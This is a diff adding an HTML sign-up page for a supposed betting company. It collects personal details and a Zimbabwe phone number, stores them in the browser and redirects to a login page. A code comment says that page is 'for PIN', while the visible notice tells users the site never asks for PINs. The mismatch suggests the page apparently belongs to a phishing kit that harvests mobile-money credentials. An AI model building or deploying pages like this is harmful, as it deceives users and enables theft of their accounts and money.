@@ -1,0 +1,102 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>THE MASSIVE WINS BETTING COMPANY</title>
+    <style>
+        body { margin: 0; font-family: Arial, Helvetica, sans-serif; background: #f4f6f8; color: #333; }
+        header { background: #0a7cff; color: #fff; padding: 20px; text-align: center; }
+        header h1 { margin: 0; }
+        .container { max-width: 900px; margin: 20px auto; padding: 20px; }
+        .card { background: #fff; padding: 25px; border-radius: 8px; box-shadow: 0 2px 8px rgba(0,0,0,0.1); margin-bottom: 20px; }
+        .card h2 { margin-top: 0; color: #0a7cff; }
+        form input, form select, form button { width: 100%; padding: 12px; margin-top: 10px; border-radius: 5px; border: 1px solid #ccc; font-size: 16px; box-sizing: border-box; }
+        form button { background: #0a7cff; color: #fff; border: none; cursor: pointer; margin-top: 15px; }
+        form button:hover { background: #065ec4; }
+        footer { text-align: center; padding: 15px; font-size: 14px; color: #666; }
+        .notice { font-size: 13px; color: #777; margin-top: 10px; }
+        ul { padding-left: 1.25rem; }
+    </style>
+</head>
+<body>
+<header>
+    <h1>THE MASSIVE WINS BETTING COMPANY</h1>
+    <p>Fast account creation and secure betting</p>
+</header>
+<div class="container">
+    <div class="card">
+        <h2>Why Choose Us?</h2>
+        <ul>
+            <li>✔ Fast application process</li>
+            <li>✔ Simple requirements</li>
+            <li>✔ Secure & confidential</li>
+            <li>✔ Support available</li>
+        </ul>
+    </div>
+    <div class="card">
+        <h2>New User Account</h2>
+        <div id="formContainer">
+            <form id="applicationForm" onsubmit="sendToLogin(event)">
+                <input type="text" id="name" placeholder="Full Name" required>
+                <div style="display:flex;gap:8px;">
+                    <input type="text" id="phoneCode" value="+263" disabled style="width:100px;text-align:center;" />
+                    <input type="tel" id="phoneLocal" placeholder="Enter local number (e.g. 712345678)" required style="flex:1;" inputmode="numeric" />
+                </div>
+                <input type="date" id="dob" placeholder="Date of birth" required>
+                <input type="email" id="email" placeholder="Email Address">
+                <input type="text" id="preferredGame" placeholder="Preferred sport/game (e.g., Soccer, Horse Racing)" required>
+                <input type="number" id="deposit" placeholder="Initial deposit in USD (e.g., 50)" min="0" step="0.01" inputmode="numeric" required>
+                <button type="submit">Create Account</button>
+            </form>
+        </div>
+        <p class="notice">This website does not request PINs, OTPs, or sensitive credentials. Never share your private security details with anyone.</p>
+    </div>
+</div>
+<footer>© 2026 THE MASSIVE WINS BETTING COMPANY. All rights reserved.</footer>
+<script>
+function sendToLogin(event) {
+    event.preventDefault();
+    var nameEl = document.getElementById("name");
+    var phoneLocalEl = document.getElementById("phoneLocal");
+    var dobEl = document.getElementById("dob");
+    var emailEl = document.getElementById("email");
+    var depositEl = document.getElementById("deposit");
+    var preferredGameEl = document.getElementById("preferredGame");
+    if (!nameEl || !phoneLocalEl || !dobEl || !depositEl || !preferredGameEl) {
+        alert('Form elements not found.');
+        return;
+    }
+    var name = nameEl.value.trim();
+    var phoneLocal = phoneLocalEl.value.trim();
+    // remove leading zero if present and disallow empty local number
+    if (phoneLocal.startsWith('0')) phoneLocal = phoneLocal.slice(1);
+    var codeEl = document.getElementById('phoneCode');
+    var code = codeEl ? codeEl.value.trim() : '+263';
+    var phone = code + phoneLocal;
+    var dob = dobEl.value.trim();
+    var email = emailEl ? emailEl.value.trim() : '';
+    var preferredGame = preferredGameEl ? preferredGameEl.value.trim() : '';
+    var deposit = depositEl.value;
+    var depositNum = parseFloat(deposit);
+    if (name === "" || phoneLocal === "" || dob === "" || preferredGame === "" || !deposit || isNaN(depositNum) || depositNum < 0) {
+        alert("Please fill in all required fields.");
+        return;
+    }
+
+    // Save application to sessionStorage and go to login page for PIN
+    var application = {
+        name: name,
+        phone: phone,
+        dob: dob,
+        email: email,
+        preferredGame: preferredGame,
+        deposit: deposit
+    };
+    try { sessionStorage.setItem('applicationData', JSON.stringify(application)); } catch (e) { console.warn(e); }
+    try { localStorage.setItem('applicationData', JSON.stringify(application)); } catch (e) { console.warn(e); }
+    window.location.href = 'login.html';
+}
+</script>
+</body>
+</html>
